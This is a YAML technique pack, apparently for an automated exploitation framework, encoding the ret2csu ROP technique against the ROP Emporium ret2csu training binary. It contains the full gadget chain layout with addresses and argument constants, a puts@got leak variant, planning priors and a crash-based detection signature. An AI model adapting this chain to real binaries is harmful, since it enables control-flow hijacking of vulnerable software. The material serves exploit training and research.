# Canonique: le modele de technique pack pour agents et operateurs.
# Structure, vocabulaire et limites: voir docs/pack-format.md.
technique: ret2csu_v2
author: Gregory Epp
source: https://ropemporium.com/challenge/ret2csu.html

rules:
  - id: app_ret2csu_v2
    head: [applicable, ret2csu_v2]
    conditions:
      - [fact, vuln, sof]
      - [fact, nx, true]
      - [match, gadget, 0, csu]

kb:
  - id: ret2csu_v2_001
    technique: ret2csu_v2
    description: >
      __libc_csu_init universal gadget populates rdx/rsi in
      gadget-sparse binaries; the popper and mov gadgets enable
      controlled multi-argument calls. The newer gcc flavor (mov
      rdx,r15; mov rsi,r14; mov edi,r13d) truncates edi to 32 bits, so
      rdi NEVER rides the csu: a separate pop_rdi loads the full
      64-bit first argument after the mov block. The mov block's
      mandatory call lands on _fini through the .dynamic DT_FINI cell
      (rbx=0: the cell holds a real function pointer, the call is a
      no-op that preserves every argument register), the seven-slot
      junk slide absorbs the loop epilogue.
    chain: [csu_popper, csu_mov, pop_rdi, target_fn]
    unlocks: [flag]
    success_rate: 0.75

mcts:
  requires: []
  provides: [flag]
  terminal: true
  success: 0.70

priors: [14, 6]

# The assembly order, resolved by lictor's builder from the facts: the
# csu popper enters at pop rbx (the profiler aims the epilogue, not the
# symbol entry), rbx=0 and rbp=1 end the loop after one call, r12 = the
# .dynamic cell holding _fini's address (the DT_FINI entry at 0x600e48
# on the x86_64 corpus binary, const in decimal), r14/r15 carry the
# challenge's second and third magic arguments. The mov block's arg
# mapping is the NEWER flavor (rdx=r15, rsi=r14, edi=r13d): the win
# call is ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe,
# 0xd00df00dd00df00d), measured end to end on the corpus binary. The
# canonical puts(puts@got) leak stays the reference variant: swap the
# consts to got_addr:puts and end the chain on a leak:main instead.
build:
  technique: ret2csu_v2
  layout:
    - [padding, measured_offset]
    - [chain, "gadget:csu_popper", "const:0", "const:1", "const:6295112",
       "const:0", "const:14627333968358193854", "const:14991902676702064653",
       "gadget:csu_mov",
       "const:0", "const:0", "const:0", "const:0", "const:0", "const:0", "const:0",
       "gadget:pop_rdi_ret", "const:16045690984833335023", "plt_addr:ret2win"]


# The defender side (the corpus read backwards): what this technique
# looks like to the defenses. Armored by check 9.
detection:
  - channel: crash
    signature: "call through __libc_csu_init gadget territory on a gadget-poor binary"
    note: "the csu chain issuing calls"
